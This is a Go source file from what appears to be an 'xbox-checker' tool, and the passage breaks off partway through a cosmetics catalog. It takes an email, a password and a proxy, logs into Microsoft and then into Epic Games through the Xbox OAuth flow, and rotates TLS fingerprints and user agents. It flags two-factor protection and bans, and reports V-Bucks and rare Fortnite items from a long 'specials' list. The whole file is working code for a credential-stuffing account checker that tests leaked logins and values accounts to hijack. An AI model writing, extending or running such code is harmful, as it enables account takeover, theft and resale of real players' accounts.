// Package epic implements the Epic Games / Fortnite account check (login via
// Xbox/Microsoft SISU, locker stats, V-Bucks, specials catalog).
package epic

import (
	"encoding/json"
	"fmt"
	http "github.com/bogdanfinn/fhttp"
	"io"
	"net/url"
	"strings"
	"time"

	"xbox-checker/internal/nettls"
)

const (
	EpicXBLLoginURL  = "https://www.epicgames.com/id/api/external/xbl/login"
	EpicRedirectURL  = "https://www.epicgames.com/id/api/redirect?"
	EpicLauncherAuth = "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y="
	EpicFortniteAuth = "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
)

func Retryable(info string) bool {
	return strings.Contains(info, "Check failed") ||
		strings.Contains(info, "CSRF") ||
		strings.Contains(info, "Bad code")
}

// CheckAccount logs into Epic via Xbox/Microsoft (config flow) and
// pulls Fortnite locker stats. Always returns a "Fortnite: ..." field.
func CheckAccount(email, password, proxyStr string) string {
	preset := nettls.NextPreset()
	client, noRedir := nettls.NewPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.Profile)
	if client == nil || noRedir == nil {
		return "Fortnite: Check failed"
	}
	jar := client.GetCookieJar()
	ua := preset.UA

	// 1) Xbox/Microsoft login then grab the SISU auth code Epic XBL login expects
	req, err := http.NewRequest("GET", nettls.MSAuthPreflightURL, nil)
	if err != nil {
		return "Fortnite: Check failed"
	}
	req.Header.Set("User-Agent", ua)
	resp, err := nettls.Do(client, req)
	if err != nil {
		return "Fortnite: Check failed"
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	ppft := nettls.ExtractPPFT(string(body))
	if ppft == "" {
		return "Fortnite: Check failed"
	}

	form := url.Values{}
	form.Set("i13", "0")
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("type", "11")
	form.Set("LoginOptions", "3")
	form.Set("passwd", password)
	form.Set("ps", "2")
	form.Set("PPFT", ppft)
	form.Set("NewUser", "1")
	form.Set("IsFidoSupported", "1")
	form.Set("i19", "36463")
	req2, _ := http.NewRequest("POST", nettls.MSLoginPostURL, strings.NewReader(form.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Origin", "https://login.live.com")
	req2.Header.Set("User-Agent", ua)
	resp2, err := nettls.Do(client, req2)
	if err != nil {
		return "Fortnite: Check failed"
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	// Epic XBL login rejects the SISU XboxLive code. It wants a code from
	// Epic's Microsoft Xbox app (client 82023151-c27d-4fb5-8551-10c10724a55e).
	epicXblAuth := "https://login.live.com/oauth20_authorize.srf?" + url.Values{
		"client_id":      {"82023151-c27d-4fb5-8551-10c10724a55e"},
		"redirect_uri":   {"https://accounts.epicgames.com/OAuthAuthorized"},
		"scope":          {"xboxlive.signin"},
		"response_type":  {"code"},
		"display":        {"popup"},
		"force_verify":   {"true"},
		"service_entity": {"undefined"},
		"prompt":         {"none"},
	}.Encode()
	req3, _ := http.NewRequest("GET", epicXblAuth, nil)
	req3.Header.Set("User-Agent", ua)
	resp3, err := nettls.Do(noRedir, req3)
	if err != nil {
		return "Fortnite: Check failed"
	}
	b3, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	loc := resp3.Header.Get("Location")
	code := nettls.ExtractParam(loc+"\n"+string(b3), "code=")
	if decoded, err := url.QueryUnescape(code); err == nil && decoded != "" {
		code = decoded
	}
	if code == "" {
		low := strings.ToLower(loc)
		if strings.Contains(low, "consent_required") ||
			strings.Contains(low, "login_required") ||
			strings.Contains(low, "interaction_required") ||
			strings.Contains(low, "access_denied") {
			return "Fortnite: No Account"
		}
		return "Fortnite: No Account"
	}

	// 2) Epic CSRF (token cookie is Path=/id)
	reqC, _ := http.NewRequest("GET", "https://www.epicgames.com/id/api/csrf", nil)
	reqC.Header.Set("User-Agent", ua)
	reqC.Header.Set("Accept", "application/json, text/plain, */*")
	if respC, err := nettls.Do(client, reqC); err == nil {
		io.Copy(io.Discard, respC.Body)
		respC.Body.Close()
	}
	xsrf := nettls.CookieValue(jar, "https://www.epicgames.com/id/api/csrf", "XSRF-TOKEN")
	if xsrf == "" {
		xsrf = nettls.CookieValue(jar, "https://www.epicgames.com/id/login", "XSRF-TOKEN")
	}

	// 3) Login to Epic with the Microsoft/Xbox code
	xblBody := fmt.Sprintf(`{"code":%q}`, code)
	reqX, _ := http.NewRequest("POST", EpicXBLLoginURL, strings.NewReader(xblBody))
	reqX.Header.Set("Content-Type", "application/json;charset=UTF-8")
	reqX.Header.Set("Accept", "application/json, text/plain, */*")
	reqX.Header.Set("User-Agent", ua)
	reqX.Header.Set("X-Requested-With", "XMLHttpRequest")
	reqX.Header.Set("Origin", "https://www.epicgames.com")
	reqX.Header.Set("Referer", "https://www.epicgames.com/id/login/xbl")
	if xsrf != "" {
		reqX.Header.Set("X-XSRF-TOKEN", xsrf)
		reqX.Header.Set("X-Xsrf-Token", xsrf)
	}
	respX, err := nettls.Do(client, reqX)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bx, _ := io.ReadAll(respX.Body)
	respX.Body.Close()
	sx := string(bx)
	if strings.Contains(sx, "Two-Factor") || strings.Contains(sx, "twoFactor") || strings.Contains(sx, "two_factor_authentication") {
		return "Fortnite: 2FA"
	}
	if strings.Contains(sx, "No account was found") || strings.Contains(sx, "DATE_OF_BIRTH") ||
		strings.Contains(sx, "link_account_not_allowed") {
		return "Fortnite: No Account"
	}
	if ec := nettls.ExtractJSONString(sx, "errorCode"); ec != "" {
		switch {
		case strings.Contains(ec, "csrf"):
			return "Fortnite: CSRF"
		case strings.Contains(ec, "invalid_grant"):
			return "Fortnite: Bad code"
		default:
			return "Fortnite: No Account"
		}
	}

	// 4) Get exchange code from Epic session
	reqEx, _ := http.NewRequest("GET", EpicRedirectURL, nil)
	reqEx.Header.Set("Accept", "application/json, text/plain, */*")
	reqEx.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/16.7.0-34134031+++Portal+Release-Live UnrealEngine/4.27.0-34134031+++Portal+Release-Live Chrome/90.0.4430.212 Safari/537.36")
	reqEx.Header.Set("X-Requested-With", "XMLHttpRequest")
	if xsrf != "" {
		reqEx.Header.Set("X-XSRF-TOKEN", xsrf)
	}
	respEx, err := nettls.Do(client, reqEx)
	if err != nil {
		return "Fortnite: No Account"
	}
	bex, _ := io.ReadAll(respEx.Body)
	respEx.Body.Close()
	ex := nettls.ExtractJSONString(string(bex), "exchangeCode")
	if ex == "" {
		ex = nettls.ExtractParam(string(bex), "\"exchangeCode\":\"")
		ex = strings.Trim(ex, `"`)
	}
	if ex == "" {
		return "Fortnite: No Account"
	}

	// 5) Exchange -> launcher token
	tokForm := url.Values{}
	tokForm.Set("grant_type", "exchange_code")
	tokForm.Set("exchange_code", ex)
	tokForm.Set("token_type", "eg1")
	reqT, _ := http.NewRequest("POST", "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token", strings.NewReader(tokForm.Encode()))
	reqT.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqT.Header.Set("Authorization", EpicLauncherAuth)
	reqT.Header.Set("User-Agent", "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit")
	respT, err := nettls.Do(client, reqT)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bt, _ := io.ReadAll(respT.Body)
	respT.Body.Close()
	at1 := nettls.ExtractJSONString(string(bt), "access_token")
	accID := nettls.ExtractJSONString(string(bt), "account_id")
	if at1 == "" {
		return "Fortnite: No Account"
	}

	// 6) Launcher token -> Fortnite client token
	reqE2, _ := http.NewRequest("GET", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange", nil)
	reqE2.Header.Set("Authorization", "bearer "+at1)
	reqE2.Header.Set("User-Agent", ua)
	respE2, err := nettls.Do(client, reqE2)
	if err != nil {
		return "Fortnite: Check failed"
	}
	be2, _ := io.ReadAll(respE2.Body)
	respE2.Body.Close()
	code22 := nettls.ExtractJSONString(string(be2), "code")
	if code22 == "" {
		return "Fortnite: Check failed"
	}

	fnForm := url.Values{}
	fnForm.Set("grant_type", "exchange_code")
	fnForm.Set("exchange_code", code22)
	reqFN, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(fnForm.Encode()))
	reqFN.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqFN.Header.Set("Authorization", EpicFortniteAuth)
	respFN, err := nettls.Do(client, reqFN)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bfn, _ := io.ReadAll(respFN.Body)
	respFN.Body.Close()
	at := nettls.ExtractJSONString(string(bfn), "access_token")
	if accID == "" {
		accID = nettls.ExtractJSONString(string(bfn), "account_id")
	}
	if at == "" {
		at = at1
	}

	displayName := nettls.ExtractJSONString(string(bt), "displayName")
	if accID != "" {
		reqAcc, _ := http.NewRequest("GET", "https://account-public-service-prod03.ol.epicgames.com/account/api/public/account/"+accID, nil)
		reqAcc.Header.Set("Authorization", "bearer "+at1)
		reqAcc.Header.Set("User-Agent", "UELauncher/11.0.2-14967703+++Portal+Release-Live Windows/10.0.19041.1.256.64bit")
		if respAcc, err := nettls.Do(client, reqAcc); err == nil {
			ba, _ := io.ReadAll(respAcc.Body)
			respAcc.Body.Close()
			if displayName == "" {
				displayName = nettls.ExtractJSONString(string(ba), "displayName")
			}
		}
	}

	// 7) STW check
	hasSTW := "NO"
	if accID != "" {
		stwURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/public/QueryPublicProfile?profileId=campaign"
		reqSTW, _ := http.NewRequest("POST", stwURL, strings.NewReader("{}"))
		reqSTW.Header.Set("Content-Type", "application/json")
		reqSTW.Header.Set("Authorization", "Bearer "+at)
		if respSTW, err := nettls.Do(client, reqSTW); err == nil {
			bstw, _ := io.ReadAll(respSTW.Body)
			respSTW.Body.Close()
			if strings.Contains(string(bstw), "tutorial") {
				hasSTW = "YES"
			}
		}
	}

	// 8) Athena locker
	skins, wins, level, banned := 0, 0, 0, false
	specials := ""
	if accID != "" {
		athURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/client/QueryProfile?profileId=athena&rvn=-1"
		reqAth, _ := http.NewRequest("POST", athURL, strings.NewReader("{}"))
		reqAth.Header.Set("Content-Type", "application/json")
		reqAth.Header.Set("Authorization", "bearer "+at)
		reqAth.Header.Set("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit")
		if respAth, err := nettls.Do(client, reqAth); err == nil {
			bath, _ := io.ReadAll(respAth.Body)
			respAth.Body.Close()
			src := string(bath)
			if strings.Contains(src, "PLAY") && (strings.Contains(src, "1023") || strings.Contains(src, "banned") || respAth.StatusCode == 403) {
				banned = true
			}
			skins = strings.Count(src, `AthenaCharacter:`)
			if n, ok := nettls.JSONIntFrom(src, "lifetime_wins"); ok {
				wins = n
			}
			if n, ok := nettls.JSONIntFrom(src, "accountLevel"); ok {
				level = n
			}
			specials = detectSpecials(src)
		}
	}

	// 9) common_core — V-Bucks (Shared + MtxPurchased + MtxPurchaseBonus)
	vbucks := 0
	if accID != "" {
		ccURL := "https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/" + accID + "/client/QueryProfile?profileId=common_core&rvn=-1"
		reqCC, _ := http.NewRequest("POST", ccURL, strings.NewReader("{}"))
		reqCC.Header.Set("Content-Type", "application/json")
		reqCC.Header.Set("Authorization", "bearer "+at)
		reqCC.Header.Set("User-Agent", "Fortnite/++Fortnite+Release-8.51-CL-6165369 Windows/10.0.17763.1.256.64bit")
		if respCC, err := nettls.Do(client, reqCC); err == nil {
			bcc, _ := io.ReadAll(respCC.Body)
			respCC.Body.Close()
			vbucks = parseVbucks(string(bcc))
		}
	}

	if banned {
		return "Fortnite: Account Banned"
	}

	parts := []string{}
	if displayName != "" {
		parts = append(parts, "Display: "+displayName)
	}
	parts = append(parts, fmt.Sprintf("Skins: %d", skins))
	parts = append(parts, fmt.Sprintf("Wins: %d", wins))
	parts = append(parts, fmt.Sprintf("Account Level: %d", level))
	parts = append(parts, "STW: "+hasSTW)
	parts = append(parts, fmt.Sprintf("VBucks: %d", vbucks))
	if specials != "" {
		parts = append(parts, "Specials: "+specials)
	}
	return "Fortnite: [" + strings.Join(parts, " | ") + "]"
}

type specialVariant struct {
	Channel string
	Stage   string
}

type specialDef struct {
	Name     string
	ID       string
	Variants []specialVariant // empty = ID only
}

func specialCatalog() []specialDef {
	return []specialDef{
		
		{Name: "OG Renegade", ID: "AthenaCharacter:cid_028_athena_commando_f", Variants: []specialVariant{{"Material", "Mat3"}}},
		{Name: "OG Aerial", ID: "AthenaCharacter:cid_017_athena_commando_m", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "OG Skull", ID: "AthenaCharacter:cid_030_athena_commando_m_halloween", Variants: []specialVariant{{"ClothingColor", "Mat3"}}},
		{Name: "OG Ghoul", ID: "AthenaCharacter:cid_029_athena_commando_f_halloween", Variants: []specialVariant{{"Material", "Mat3"}}},
		{Name: "Max Omega", ID: "AthenaCharacter:cid_116_athena_commando_m_carbideblack", Variants: []specialVariant{{"Progressive", "Stage5"}}},
		{Name: "OG Ghost Portal", ID: "AthenaBackpack:bid_104_halloweenm", Variants: []specialVariant{{"ClothingColor", "Stage3"}}},
		{Name: "Max Peely", ID: "AthenaBackpack:bid_463_bananaagent", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "Mini Marauder", ID: "AthenaBackpack:bid_154_gingerbreadmale", Variants: []specialVariant{{"Material", "Stage2"}}},
		{Name: "Giddy-Gun", ID: "AthenaBackpack:bid_155_gingerbreadfemale", Variants: []specialVariant{{"Material", "Stage2"}}},
		{Name: "Black Knight", ID: "AthenaCharacter:cid_035_athena_commando_m_medieval"},
		{Name: "Galaxy", ID: "AthenaCharacter:cid_175_athena_commando_m_celestial"},
		{Name: "IKONIK", ID: "AthenaCharacter:cid_313_athena_commando_m_kpopfashion"},
		{Name: "Honor Guard", ID: "AthenaCharacter:cid_342_athena_commando_m_streetracermetallic"},
		{Name: "Wonder", ID: "AthenaCharacter:cid_434_athena_commando_f_stealthhonor"},
		{Name: "Double Helix", ID: "AthenaCharacter:cid_183_athena_commando_m_modernmilitaryred"},
		{Name: "Stealth Reflex", ID: "AthenaCharacter:cid_386_athena_commando_m_streetopsstealth"},
		{Name: "Eon", ID: "AthenaCharacter:cid_174_athena_commando_f_carbidewhite"},
		{Name: "Wildcat", ID: "AthenaCharacter:cid_757_athena_commando_f_wildcat"},
		{Name: "Marshmello", ID: "AthenaCharacter:cid_333_athena_commando_m_squishy"},
		{Name: "Major Lazer", ID: "AthenaCharacter:cid_474_athena_commando_m_lasagna"},
		{Name: "Psycho Bandit", ID: "AthenaCharacter:cid_515_athena_commando_m_barbequelarry"},
		{Name: "Demogorgon", ID: "AthenaCharacter:cid_466_athena_commando_m_weirdobjectscreature"},
		{Name: "Travis Scott", ID: "AthenaCharacter:cid_703_athena_commando_m_cyclone"},
		{Name: "Astro Jack", ID: "AthenaCharacter:cid_761_athena_commando_m_cyclonespace"},
		{Name: "OG Raider's Revenge", ID: "AthenaPickaxe:pickaxe_lockjaw", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "Axe of Champions", ID: "AthenaPickaxe:pickaxe_id_376_fncs"},
		{Name: "Axe of Champions 2.0", ID: "AthenaPickaxe:pickaxe_id_804_fncss20male"},
		{Name: "Merry Mint Axe", ID: "AthenaPickaxe:pickaxe_id_294_candycane"},
		{Name: "Resonator", ID: "AthenaPickaxe:pickaxe_id_077_carbidewhite"},
		{Name: "Stellar Axe", ID: "AthenaPickaxe:pickaxe_id_116_celestial"},
		{Name: "Angler Pickaxe", ID: "AthenaPickaxe:pickaxe_id_156_streetracerblue"},
		{Name: "Rhizonyx", ID: "AthenaPickaxe:pickaxe_id_109_archetypered"},
		{Name: "Pivot Axe", ID: "AthenaPickaxe:pickaxe_id_147_reflexred"},
		{Name: "Diamond Jack", ID: "AthenaPickaxe:pickaxe_id_365_cyclone"},
		{Name: "Lazer Axe", ID: "AthenaPickaxe:pickaxe_id_258_musicgroup"},
		{Name: "Psycho Buzz Axes", ID: "AthenaPickaxe:pickaxe_id_250_borderlands"},
		{Name: "OG Aerial Assault One", ID: "AthenaGlider:glider_id_001", Variants: []specialVariant{{"Parts", "Stage2"}}},
		{Name: "Discovery", ID: "AthenaGlider:glider_id_090_galaxy"},
		{Name: "Aurora", ID: "AthenaGlider:glider_id_088_criterionred"},
		{Name: "Teleporter", ID: "AthenaGlider:glider_id_109_archetypered"},
		{Name: "Pivot Glider", ID: "AthenaGlider:glider_id_147_reflexred"},
		{Name: "Snowflake", ID: "AthenaGlider:umbrella_season2"},
		{Name: "Astroworld Cyclone", ID: "AthenaGlider:glider_id_203_cyclone"},
		{Name: "Floss", ID: "AthenaDance:eid_floss"},
		{Name: "The Worm", ID: "AthenaDance:eid_worm"},
		{Name: "Pony Up", ID: "AthenaDance:eid_ridetheponytwo"},
		{Name: "Scenario", ID: "AthenaDance:eid_kpopdance03"},
		{Name: "Levitate", ID: "AthenaDance:eid_davinci"},
		{Name: "Bhangra Boogie", ID: "AthenaDance:eid_bollywood"},
		{Name: "Click!", ID: "AthenaDance:eid_heelclick"},
		{Name: "Headbanger", ID: "AthenaDance:eid_headbang"},
		{Name: "Black Shield", ID: "AthenaBackpack:bid_004_blackknight"},
		{Name: "Royale Shield", ID: "AthenaBackpack:bid_002_royaleknight"},
		{Name: "Squire Shield", ID: "AthenaBackpack:bid_001_bluesquire"},
		{Name: "Red Shield", ID: "AthenaBackpack:bid_003_redknight"},
		{Name: "Rust Bucket", ID: "AthenaBackpack:bid_027_scavenger"},
		{Name: "Cactus Jack", ID: "AthenaBackpack:bid_468_cyclone"},
		{Name: "Penguin", ID: "AthenaBackpack:bid_071_tencentpenguin"},
		{Name: "Insignia", ID: "AthenaBackpack:bid_072_tencentshield"},
		{Name: "Galactic Disc", ID: "AthenaBackpack:bid_102_galaxy"},
		{Name: "Telemetry", ID: "AthenaBackpack:bid_124_archetypered"},
		{Name: "Destabilizer", ID: "AthenaBackpack:bid_099_criterionred"},
		{Name: "Response Unit", ID: "AthenaBackpack:bid_168_reflexred"},
		{Name: "Cactus Jack", ID: "AthenaBackpack:bid_497_cyclone"},
		{Name: "Astroworld", ID: "AthenaBackpack:bid_498_astroworld"},
		{Name: "Deflector", ID: "AthenaBackpack:bid_053_commando"},
		{Name: "Kyo", ID: "AthenaBackpack:bid_291_cyberpunkblue"},
		{Name: "Phrenzy", ID: "AthenaBackpack:bid_612_skaterparkour"},
		{Name: "Blue Shift", ID: "AthenaBackpack:bid_039_tacticalblue"},
		{Name: "Carbon Pack", ID: "AthenaBackpack:bid_219_streetops"},
		{Name: "Mello Pod", ID: "AthenaBackpack:bid_198_marshmello"},
		{Name: "Lazer Wings", ID: "AthenaBackpack:bid_328_musicgroup"},
		{Name: "Psycho Claptrap", ID: "AthenaBackpack:bid_312_borderlands"},
		{Name: "RLG FNCS 2021", ID: "AthenaBackpack:bid_700_fncs"},
		{Name: "Precision", ID: "AthenaBackpack:bid_016_military"},
		{Name: "Backup Plan", ID: "AthenaBackpack:bid_018_commando"},
		{Name: "Max Master Chief", ID: "AthenaCharacter:cid_971_athena_commando_m_jupiter_s0z6m", Variants: []specialVariant{{"Material", "Mat2"}}},
		{Name: "Max Fishstick", ID: "AthenaCharacter:cid_315_athena_commando_m_teriyakifish", Variants: []specialVariant{{"Progressive", "Stage3"}}},
		{Name: "Max Agent Peely", ID: "AthenaCharacter:cid_701_athena_commando_m_bananaagent", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "Max Skye", ID: "AthenaCharacter:cid_690_athena_commando_f_photographer", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "Max TNTina", ID: "AthenaCharacter:cid_691_athena_commando_f_tntina", Variants: []specialVariant{{"Progressive", "Stage7"}}},
		{Name: "Max Meowscles", ID: "AthenaCharacter:cid_693_athena_commando_m_buffcat", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "Max Midas", ID: "AthenaCharacter:cid_694_athena_commando_m_catburglar", Variants: []specialVariant{{"Progressive", "Stage4"}}},
		{Name: "Blade of Champions", ID: "AthenaPickaxe:pickaxe_fncs_s32"},
		{Name: "Sparkle Specialist", ID: "AthenaCharacter:cid_039_athena_commando_f_disco"},
		{Name: "Indigo Kuno", ID: "AthenaCharacter:cid_660_athena_commando_f_bandageninjablue"},
		{Name: "Brilliant Bomber", ID: "AthenaCharacter:cid_619_athena_commando_f_techllama"},
		{Name: "Reflex", ID: "AthenaCharacter:cid_259_athena_commando_m_streetops"},
		{Name: "Huntmaster Saber", ID: "AthenaCharacter:character_masterkeyorder"},
		{Name: "Dark Vertex", ID: "AthenaCharacter:cid_371_athena_commando_m_speedymidnight"},
		{Name: "Rue", ID: "AthenaCharacter:cid_753_athena_commando_f_hostile"},
		{Name: "Glow", ID: "AthenaCharacter:cid_479_athena_commando_f_davinci"},
		{Name: "Rogue Spider Knight", ID: "AthenaCharacter:cid_516_athena_commando_m_blackwidowrogue"},
		{Name: "Neo Versa", ID: "AthenaCharacter:cid_441_athena_commando_f_cyberscavengerblue"},
		{Name: "Surf Strider", ID: "AthenaCharacter:cid_783_athena_commando_m_aquajacket"},
		{Name: "Dark Skully", ID: "AthenaCharacter:cid_850_athena_commando_f_skullbritecube"},
		{Name: "Royale Bomber", ID: "AthenaCharacter:cid_113_athena_commando_m_blueace"},
		{Name: "Royale Knight", ID: "AthenaCharacter:cid_033_athena_commando_f_medieval"},
		{Name: "Blue Squire", ID: "AthenaCharacter:cid_032_athena_commando_m_medieval"},
		{Name: "The Reaper", ID: "AthenaCharacter:cid_084_athena_commando_m_assassin"},
		{Name: "Elite Agent", ID: "AthenaCharacter:cid_083_athena_commando_f_tactical"},
		{Name: "Rogue Agent", ID: "AthenaCharacter:cid_090_athena_commando_m_tactical"},
		{Name: "World Warrior", ID: "AthenaCharacter:cid_478_athena_commando_f_worldcup"},
		{Name: "Kratos", ID: "AthenaCharacter:cid_964_athena_commando_m_historian_869bc"},
		{Name: "Sub Commander", ID: "AthenaCharacter:cid_085_athena_commando_m_twitch"},
		{Name: "Havoc", ID: "AthenaCharacter:cid_089_athena_commando_m_retrogrey"},
		{Name: "Trailblazer", ID: "AthenaCharacter:cid_114_athena_commando_f_tacticalwoodland"},
		{Name: "Rose Team Leader", ID: "AthenaCharacter:cid_096_athena_commando_f_founder"},
		{Name: "Warpaint", ID: "AthenaCharacter:cid_095_athena_commando_m_founder"},
		{Name: "Cobalt Snowfoot", ID: "AthenaCharacter:character_snowninjadark"},
		{Name: "Blue Team Leader", ID: "AthenaCharacter:cid_052_athena_commando_f_psblue"},
		{Name: "Blue Striker", ID: "AthenaCharacter:cid_138_athena_commando_m_psburnout"},
		{Name: "Prodigy", ID: "AthenaCharacter:cid_296_athena_commando_m_math"},
		{Name: "Carbon Commando", ID: "AthenaCharacter:cid_360_athena_commando_m_techopsblue"},
		{Name: "Fixer", ID: "AthenaCharacter:cid_a_101_athena_commando_m_tacticalwoodlandblue"},
		{Name: "Blizzard Bomber", ID: "AthenaCharacter:cid_a_421_athena_commando_f_blizzardbomber"},
		{Name: "Trilogy", ID: "AthenaCharacter:cid_657_athena_commando_f_techopsblue"},
		{Name: "Point Patroller", ID: "AthenaCharacter:cid_711_athena_commando_m_longshorts"},
		{Name: "Jun-Hwan", ID: "AthenaCharacter:character_bluejet"},
		{Name: "Cloud Striker", ID: "AthenaCharacter:cid_926_athena_commando_f_streetfashiondiamond"},
		{Name: "Lina Scorch", ID: "AthenaCharacter:character_retrowheels"},
		{Name: "Color Splash Jellie", ID: "AthenaCharacter:character_tubagummi"},
		{Name: "Loons", ID: "AthenaBackpack:bid_415_techllama"},
		{Name: "Galactic Disc", ID: "AthenaBackpack:bid_138_celestial"},
		{Name: "Sleek Strike", ID: "AthenaBackpack:bid_521_wildcat"},
		{Name: "Stealth Response Unit", ID: "AthenaBackpack:bid_249_streetopsstealth"},
		{Name: "Dark Deflector", ID: "AthenaBackpack:bid_234_speedymidnight"},
		{Name: "Dark Skully Satchel", ID: "AthenaBackpack:bid_604_skullbritecube"},
		{Name: "Telemetry", ID: "AthenaBackpack:bid_114_modernmilitaryred"},
		{Name: "Rogue Spider Shield", ID: "AthenaBackpack:bid_346_blackwidowrogue"},
		{Name: "Claptrap", ID: "AthenaBackpack:petcarrier_013_bbqlarry"},
		{Name: "Sapphire Star", ID: "AthenaBackpack:backpack_snowninjadark"},
		{Name: "Mountaineer's Must-Haves", ID: "AthenaBackpack:bid_a_019_blizzardbomberfemale"},
		{Name: "Tabulator", ID: "AthenaBackpack:bid_169_mathmale"},
		{Name: "Carbon Pack", ID: "AthenaBackpack:bid_224_techopsblue"},
		{Name: "Burning Ember Holster", ID: "AthenaBackpack:backpack_bluejet"},
		{Name: "Cryptic Sling-kit", ID: "AthenaBackpack:backpack_snowsoldierfashion"},
		{Name: "Astroworld", ID: "AthenaBackpack:bid_520_cycloneuniverse"},
		{Name: "FNCS Warrior", ID: "AthenaBackpack:backpack_fncsshield_s32"},
		{Name: "Electri-claw", ID: "AthenaPickaxe:pickaxe_id_398_wildcatfemale"},
		{Name: "Pinpoint", ID: "AthenaPickaxe:pickaxe_id_099_modernmilitaryred"},
		{Name: "Dark Splitter", ID: "AthenaPickaxe:pickaxe_id_461_skullbritecube"},
		{Name: "Stealth Angular Axe", ID: "AthenaPickaxe:pickaxe_id_189_streetopsstealth"},
		{Name: "Dark Razor", ID: "AthenaPickaxe:pickaxe_id_178_speedymidnight"},
		{Name: "Leviathan Axe", ID: "AthenaPickaxe:pickaxe_id_508_historianmale_6bqsw"},
		{Name: "AC/DC", ID: "AthenaPickaxe:pickaxe_id_013_teslacoil"},
		{Name: "Axecalibur", ID: "AthenaPickaxe:pickaxe_id_011_medieval"},
		{Name: "EVA", ID: "AthenaPickaxe:pickaxe_id_028_space"},
		{Name: "Crowbar", ID: "AthenaPickaxe:pickaxe_id_092_bling"},
		{Name: "Instigator", ID: "AthenaPickaxe:pickaxe_id_039_tacticalblack"},
		{Name: "Tenderizer", ID: "AthenaPickaxe:pickaxe_id_044_tacticalurbanhammer"},
		{Name: "Psycho Buzz Axes", ID: "AthenaPickaxe:pickaxe_id_265_barbequelarry1h"},
		{Name: "Axehammer", ID: "AthenaPickaxe:pickaxe_id_stw006_tier_7"},
		{Name: "Rose Glow", ID: "AthenaPickaxe:pickaxe_id_153_roseleader"},
		{Name: "Indigo Inverter", ID: "AthenaPickaxe:pickaxe_snowninjadark"},
		{Name: "Blue Shift", ID: "AthenaBackpack:bid_055_psburnout"},
		{Name: "Controller", ID: "AthenaPickaxe:pickaxe_id_088_psburnout"},
		{Name: "Pneumatic Twin", ID: "AthenaPickaxe:pickaxe_id_256_techopsblue"},
		{Name: "Perfect Point", ID: "AthenaPickaxe:pickaxe_id_464_longshortsmale"},
		{Name: "Cymitar", ID: "AthenaPickaxe:pickaxe_id_717_networkfemale"},
		{Name: "Future Relic Scythe", ID: "AthenaPickaxe:pickaxe_snowsoldierfashion"},
		{Name: "Petrol Pump", ID: "AthenaPickaxe:pickaxe_retrowheels"},
		{Name: "Laser Pick", ID: "AthenaPickaxe:pickaxe_id_stw005_tier_6"},
		{Name: "Vindertech Elite", ID: "AthenaPickaxe:pickaxe_id_stw004_tier_5"},
		{Name: "Hydraulic Wrecker", ID: "AthenaPickaxe:pickaxe_id_stw003_tier_4"},
		{Name: "Tech Axe", ID: "AthenaPickaxe:pickaxe_id_stw002_tier_3"},
		{Name: "Basic Basher", ID: "AthenaPickaxe:pickaxe_id_stw007_basic"},
		{Name: "Ol' Woody", ID: "AthenaPickaxe:pickaxe_id_stw001_tier_1"},
		{Name: "Sunfall Scythe", ID: "AthenaPickaxe:pickaxe_spookyneonred"},
		{Name: "Midnight Scythe", ID: "AthenaPickaxe:pickaxe_spookyneonblue"},
		{Name: "Diamond Jack", ID: "AthenaPickaxe:pickaxe_id_359_cyclonemale"},
		{Name: "Fresh", ID: "AthenaDance:eid_fresh"},
		{Name: "Take The L", ID: "AthenaDance:eid_takethel"},
		{Name: "Freestylin'", ID: "AthenaDance:eid_hiphop01"},
		{Name: "Orange Justice", ID: "AthenaDance:eid_goodvibes"},
		{Name: "Point It Out", ID: "AthenaDance:eid_iceking"},
		{Name: "It's Complicated", ID: "AthenaDance:eid_richfam"},
		{Name: "Introducing...", ID: "AthenaDance:eid_playereleven"},
		{Name: "Zombie Shambles", ID: "AthenaDance:eid_rigormortis"},
		{Name: "Follow the Butterfly", ID: "AthenaDance:eid_gleam"},
		{Name: "Stuck", ID: "AthenaDance:eid_downward_8gzua"},
		{Name: "Head Banger", ID: "AthenaDance:eid_cycloneheadbang"},
		{Name: "Go Mufasa", ID: "AthenaDance:eid_sandwichbop"},
		{Name: "Out West", ID: "AthenaDance:eid_julybooks"},
		{Name: "Laugh It Up", ID: "AthenaDance:eid_laugh"},
		{Name: "The Look", ID: "AthenaDance:eid_textile_3o8qg"},
		{Name: "Punching Practice", ID: "AthenaDance:eid_uproar_496sc"},
		{Name: "Tidy", ID: "AthenaDance:eid_tidy"},
		{Name: "Rambunctious", ID: "AthenaDance:eid_zippy"},
